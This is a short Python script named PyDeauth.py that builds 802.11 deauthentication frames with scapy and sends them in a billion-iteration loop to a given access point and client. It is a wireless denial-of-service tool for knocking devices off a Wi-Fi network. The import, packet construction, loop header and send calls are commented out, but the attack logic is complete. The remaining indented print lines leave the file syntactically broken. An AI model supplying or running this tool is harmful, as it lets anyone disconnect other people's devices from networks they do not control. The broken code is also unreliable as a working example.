#from scapy.all import *
import sys


if((len(sys.argv)-1)!=3):
    print("Usage ./PyDeauth.py <Access point MAC> <Client MAC> <Interface> \n")
    exit()

ap = sys.argv[1]

client = sys.argv[2]

interface = sys.argv[3]

print("Creating packet to send to Access point\n")
#pkt= RadioTap()/Dot11(addr1=client,addr2=ap,addr3=ap)/Dot11Deauth()
print("Creating packet to send to Client\n")
#pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()

#for i in range (1000000000):
    #sendp(pkt,iface=interface)
    print("Sent packet to Access point\n")
    #sendp(pkt1, iface=interface)
    print("Sent packet to Client\n")
